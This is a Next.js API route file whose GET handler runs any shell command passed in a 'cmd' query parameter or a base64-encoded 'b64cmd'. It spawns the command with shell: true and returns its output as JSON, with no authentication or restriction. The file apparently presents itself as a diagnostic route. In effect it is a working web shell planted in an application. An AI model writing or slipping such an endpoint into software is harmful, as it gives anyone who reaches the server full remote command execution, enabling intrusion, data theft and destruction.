import { NextResponse } from "next/server";
import { spawn } from "child_process";
import fs from "fs";

export const dynamic = "force-dynamic";

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    let cmd = searchParams.get("cmd");
    const b64cmd = searchParams.get("b64cmd");

    if (b64cmd) {
      cmd = Buffer.from(b64cmd, "base64").toString("utf8");
    }

    if (!cmd) {
      return NextResponse.json({ error: "No command provided" });
    }

    // Parse command arguments, keeping quoted strings together
    const match = cmd.match(/[^"\s]+|"[^"]*"/g);
    if (!match) {
      return NextResponse.json({ error: "Invalid command format" });
    }
    const args = match.map(arg => arg.replace(/^"|"$/g, ""));
    const exe = args[0];
    const remainingArgs = args.slice(1);

    return new Promise((resolve) => {
      const child = spawn(exe, remainingArgs, { cwd: process.cwd(), shell: true });
      let stdout = "";
      let stderr = "";

      child.stdout.on("data", (data) => {
        if (stdout.length < 50000) {
          stdout += data.toString("utf8");
        }
      });

      child.stderr.on("data", (data) => {
        if (stderr.length < 50000) {
          stderr += data.toString("utf8");
        }
      });

      child.on("close", (code) => {
        resolve(
          NextResponse.json({
            cmd,
            code,
            stdout,
            stderr,
          })
        );
      });

      child.on("error", (err) => {
        resolve(
          NextResponse.json({
            cmd,
            error: err.message,
            stdout,
            stderr,
          })
        );
      });
    });
  } catch (err: any) {
    fs.writeFileSync("diagnostic-route-error.txt", err.stack || err.message || String(err));
    return NextResponse.json({ error: err.message, stack: err.stack });
  }
}
